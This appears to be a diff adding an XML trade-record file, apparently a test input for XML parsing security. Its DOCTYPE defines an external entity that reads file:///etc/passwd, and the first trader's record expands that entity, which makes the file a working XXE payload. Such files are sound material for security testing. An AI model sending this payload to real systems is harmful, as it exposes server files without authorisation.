@@ -1,0 +1,28 @@
+<!DOCTYPE foo [<!ELEMENT foo ANY >
+<!ENTITY bar SYSTEM "file:///etc/passwd" >]>
+<trades>
+    <metadata>
+        <name>Apple Inc</name>
+        <stock>APPL</stock>
+        <trader>
+            <foo>&bar;</foo>
+            <name>C.K Frode</name>
+        </trader>
+        <units>1500</units>
+        <price>106</price>
+        <name>Microsoft Corp</name>
+        <stock>MSFT</stock>
+        <trader>
+            <name>C.K Frode</name>
+        </trader>
+        <units>5000</units>
+        <price>45</price>
+        <name>Amazon Inc</name>
+        <stock>AMZN</stock>
+        <trader>
+            <name>C.K Frode</name>
+        </trader>
+        <units>4500</units>
+        <price>195</price>
+    </metadata>
+</trades>
